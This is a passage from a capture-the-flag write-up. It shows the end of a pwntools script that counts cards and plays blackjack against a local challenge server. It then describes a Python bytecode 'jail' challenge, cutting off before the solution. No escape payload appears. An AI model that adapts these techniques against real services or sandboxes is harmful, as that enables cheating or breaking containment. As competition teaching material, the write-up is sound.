style=\"--0:#E1E4E8\">][upcard \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"USING PLAYER TOTAL STRATEGY\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">option \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">PLAYER_TOTAL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[my_value \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">][upcard \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">resolve_and_execute\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(option):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> option \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> options:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">p.sendline(option)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">f\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Choosing \u003C/span>\u003Cspan style=\"--0:#79B8FF\">{\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">option\u003C/span>\u003Cspan style=\"--0:#79B8FF\">}\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">f\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Choosing \u003C/span>\u003Cspan style=\"--0:#79B8FF\">{\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">option\u003C/span>\u003Cspan style=\"--0:#79B8FF\">}\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">, resolving to hit\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">p.sendline(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'hit'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">resolve_and_execute(option)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">except\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">EOFError\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">sprint(p.clean().decode())\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">break\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(resp)\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"H, S, D, SP = &#x27;hit&#x27;, &#x27;stand&#x27;, &#x27;double&#x27;, &#x27;split&#x27;PLAYER_TOTAL = [    #   2       3       4       5       6       7       8       9       10      A    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 2    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 3    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 4    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 5    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 6    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 7    [   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  # 8    [   H,      D,      D,      D,      D,      H,      H,      H,      H,      H   ],  # 9    [   D,      D,      D,      D,      D,      D,      D,      D,      H,      H   ],  # 10    [   D,      D,      D,      D,      D,      D,      D,      D,      D,      H   ],  # 11    [   H,      H,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 12    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 13    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 14    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 15    [   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  # 16    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 17    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 18    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 19    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 20]HANDS_WITH_ACE = [    #   2       3       4       5       6       7       8       9       10      A    [   H,      H,      H,      D,      D,      H,      H,      H,      H,      H   ],  # A2    [   H,      H,      H,      D,      D,      H,      H,      H,      H,      H   ],  # A3    [   H,      H,      D,      D,      D,      H,      H,      H,      H,      H   ],  # A4    [   H,      H,      D,      D,      D,      H,      H,      H,      H,      H   ],  # A5    [   H,      D,      D,      D,      D,      H,      H,      H,      H,      H   ],  # A6    [   S,      D,      D,      D,      D,      S,      S,      H,      H,      H   ],  # A7    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # A8    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # A9]PAIR = [    #   2       3       4       5       6       7       8       9       10      A    [   SP,     SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H   ],  # 2,2    [   SP,     SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H   ],  # 3,3    [   H,      H,      H,      SP,     SP,     H,      H,      H,      H,      H   ],  # 4,4    [   D,      D,      D,      D,      D,      D,      D,      D,      H,      H   ],  # 5,5    [   SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H,      H   ],  # 6,6    [   SP,     SP,     SP,     SP,     SP,     SP,     H,      H,      H,      H   ],  # 7,7    [   SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP  ],  # 8,8    [   SP,     SP,     SP,     SP,     SP,     S,      SP,     SP,     S,      S   ],  # 9,9    [   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  # 10,10    [   SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP,     SP  ],  # A,A]import redef extract_cards_from_string(s):    extract = r&#x22;\\b(\\w+|\\d+)\\s+of\\b&#x22;    return re.findall(extract, s)def get_value(cards):    value = 0    aces = 0    for card in cards:        if card.isnumeric():            value += int(card)        else:            if card == &#x27;Ace&#x27;:                aces += 1                value += 11            else:                value += 10    while value > 21 and aces:        value -= 10        aces -= 1    soft = aces > 0    return value, softfrom pwn import *BALANCE = 30000sprint = printprint = lambda *x: Nonedef update_count(card):    global count    if card not in [&#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;10&#x27;, &#x27;Jack&#x27;, &#x27;Queen&#x27;, &#x27;King&#x27;, &#x27;Ace&#x27;]:        print(&#x22;INVALID CARD&#x22;, card)        exit()    if card in [&#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;]:        count += 1    elif card in [&#x27;10&#x27;, &#x27;Jack&#x27;, &#x27;Queen&#x27;, &#x27;King&#x27;, &#x27;Ace&#x27;]:        count -= 1count = 0cards_seen = 0game_state = {}validate_end_turn_computation = 1import timep = remote(&#x22;127.0.0.1&#x22;, 36051)while 1:    try:        resp = p.recvuntil(b&#x22;[BEGIN USER INTERACTION]\\n&#x22;)[:-len(b&#x22;[BEGIN USER INTERACTION]\\n&#x22;)].decode().split(&#x22;\\n&#x22;)        resp = [x.strip() for x in resp if x]        for line in resp:            print(f&#x22;[RESP] {line}&#x22;)        # This message gives information about the count        if resp[-1].startswith(&#x22;Player balance&#x22;):            BALANCE = float(resp[-1].split(&#x22; &#x22;)[-1])            sprint(&#x22;MY BALANCE: &#x22;, BALANCE)            dealer_hand = [line for line in resp if line.startswith(&#x22;[Dealer] Dealer&#x27;s ending hand&#x22;)]            if not dealer_hand:                validate_end_turn_computation -= 1                if validate_end_turn_computation \u003C 0:                    print(&#x22;SOMETHING IS WRONG&#x22;)                    exit()            else:                ending_hand_line = [line for line in resp if line.startswith(&#x22;[Dealer] Dealer&#x27;s ending hand&#x22;)][0]                my_ending_hands = [line for line in resp[resp.index(ending_hand_line):] if line.startswith(&#x22;(Hand &#x22;)]                dealer_hand = extract_cards_from_string(ending_hand_line)                my_ending_hands = [extract_cards_from_string(hand) for hand in my_ending_hands]                print(resp)                print(my_ending_hands, dealer_hand)                for card in dealer_hand:                    update_count(card)                    cards_seen += 1                for hand in my_ending_hands:                    for card in hand:                        update_count(card)                        cards_seen += 1        for line in resp:            if &#x22;Resetting shoe&#x22; in line:                print(&#x22;RESET COUNT&#x22;)                count = 0                cards_seen = 0            if &#x22;Remaining balance&#x22; in line:                BALANCE = float(line.split(&#x27;$&#x27;)[-1])            elif &#x22;Dealer&#x27;s up card&#x22; in line:                upcard = extract_cards_from_string(line)[0]                game_state[&#x27;upcard&#x27;], _ = get_value([upcard])        input_prompt = p.recv().decode()        print(&#x22;INPUT>>> &#x22; + input_prompt)        if &#x22;enter your bet&#x22; in input_prompt:            # High risk high reward counting strategy            true_count = int(count / ((52*4 - cards_seen) / (52)))            if true_count \u003C= 1:                bet = max(50, min(BALANCE, 50))            elif true_count == 2:                bet = max(50, min(BALANCE, 500))            elif true_count == 3:                bet = max(50, min(BALANCE, 2000))            elif true_count == 4:                bet = max(50, min(BALANCE, 2000))            elif true_count >= 5:                bet = max(50, min(BALANCE, 2000))            p.sendline(str(int(bet)))            BALANCE -= bet            game_state = {}        elif &#x22;What would you like to do?&#x22; in input_prompt:            options = input_prompt.split(&#x22;(&#x22;)[-1].split(&#x22;)&#x22;)[0].split(&#x22;, &#x22;)            print(resp)            my_cards = [line for line in resp if line.startswith(&#x22;(Hand &#x22;)][-1]            my_cards = extract_cards_from_string(my_cards)            my_value, soft = get_value(my_cards)            if my_value == 21:                p.sendline(b&#x22;stand&#x22;)                continue            upcard = game_state[&#x27;upcard&#x27;]            print(&#x22;My cards: &#x22;, my_cards)            print(&#x22;My value: &#x22;, my_value)            print(&#x22;Soft: &#x22;, soft)            print(&#x22;Upcard: &#x22;, upcard)            if len(my_cards) == 2 and my_cards[0] == my_cards[1] and &#x27;split&#x27; in options:                print(&#x22;USING PAIR STRATEGY&#x22;)                option = PAIR[get_value([my_cards[0]])[0] - 2][upcard - 2]            elif soft:                print(&#x22;USING HANDS WITH ACE STRATEGY&#x22;)                option = HANDS_WITH_ACE[my_value - 13][upcard - 2]            else:                print(&#x22;USING PLAYER TOTAL STRATEGY&#x22;)                option = PLAYER_TOTAL[my_value - 2][upcard - 2]            def resolve_and_execute(option):                if option in options:                    p.sendline(option)                    print(f&#x22;Choosing {option}&#x22;)                else:                    print(f&#x22;Choosing {option}, resolving to hit&#x22;)                    p.sendline(b&#x27;hit&#x27;)            resolve_and_execute(option)    except EOFError:        sprint(p.clean().decode())        breakprint(resp)\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Ch3 id=\"references\">\u003Ca href=\"#references\">References\u003C/a>\u003C/h3>\n\u003Cul>\n\u003Cli>\u003Ca href=\"https://www.blackjackapprenticeship.com/blackjack-strategy-charts/\">https://www.blackjackapprenticeship.com/blackjack-strategy-charts/\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://en.wikipedia.org/wiki/Card_counting\">https://en.wikipedia.org/wiki/Card_counting\u003C/a>\u003C/li>\n\u003C/ul>\n\u003Chr>\n\u003Ch2 id=\"my-favorite-code-1-solve-500-pts\">\u003Ca href=\"#my-favorite-code-1-solve-500-pts\">my-favorite-code (1 solve, 500 pts)\u003C/a>\u003C/h2>\n\u003Ch3 id=\"description-1\">\u003Ca href=\"#description-1\">Description\u003C/a>\u003C/h3>\n\u003Cp>Hey. I’m looking for my friend Penguin, have you seen him?\u003C/p>\n\u003Ch3 id=\"challenge-1\">\u003Ca href=\"#challenge-1\">Challenge\u003C/a>\u003C/h3>\n\u003Cp>You are given an attachment \u003Ccode>my-favorite-code.zip\u003C/code>. This file contains \u003Ccode>jail.py\u003C/code>, and a Dockerfile for the remote setup.\u003C/p>\n\u003Cp>The file first prompts the user to select their favorite python opcode. It then adds both the users selected opcode and \u003Ccode>COMPARE_OP\u003C/code> to a set called \u003Ccode>CHOICES\u003C/code>.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">CHOICES\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">set\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"My favorite python opcode is COMPARE_OP!\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">CHOICES\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.add(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'COMPARE_OP'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"What is your favorite python opcode?\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">op \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">input\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> op \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> opcode.opmap:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"That opcode doesn't exist!\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">exit\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">CHOICES\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.add(op)\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"CHOICES = set()print(&#x22;My favorite python opcode is COMPARE_OP!&#x22;)CHOICES.add(&#x27;COMPARE_OP&#x27;)print(&#x22;What is your favorite python opcode?&#x22;)op = input()if op not in opcode.opmap:    print(&#x22;That opcode doesn&#x27;t exist!&#x22;)    exit()CHOICES.add(op)\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Next, we are asked to provide some base64 encoded string.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"I wonder what we can do with these...\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">code \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> base64.b64decode(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">input\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">())\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"print(&#x22;I wonder what we can do with these...&#x22;)code = base64.b64decode(input())\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Finally, the code is run:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> run(code):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"I guess not much.\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"WOW\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"if not run(code):    print(&#x22;I guess not much.&#x22;)else:    print(&#x22;WOW&#x22;)\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Lets look a bit closer at this run method:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">get_instructions\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(func):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {x.opname \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> dis.Bytecode(func)}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">run\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(code):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">code \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> marshal.loads(code)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">instructions \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> get_instructions(code)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> instructions \u003C/span>\u003Cspan style=\"--0:#F97583\">!=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">CHOICES\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">False\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">runner\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">():\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF\">...\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">runner.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">__code__\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> code\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">runner()\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"def get_instructions(func):    return {x.opname for x in dis.Bytecode(func)}def run(code):    code = marshal.loads(code)    instructions = get_instructions(code)    if instructions != CHOICES:        return False    def runner():        ...    runner.__code__ = code    runner()\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>We unmarshal the bytes sent by the user. We then use \u003Ccode>dis.Bytecode\u003C/code> to get a set containing of all the OPCODES in the main procedure of the function. Finally, if this set is equal to our original choices, we run the code, by replacing the \u003Ccode>__code__\u003C/code> object of a dummy function to the inputted code object, and calling it.\u003C/p>\n\u003Cp>Note furthermore, the docker container shows that we have a flag on the system, which implies that this challenge requires us to run arbitrary code and escape the jail.\u003C/p>\n\u003Ch3 id=\"solution\">\u003Ca href=\"#solution\">Solution\u003C/a>\u003C/h3>\n\u003Cp>What appears to be happening is that we need to 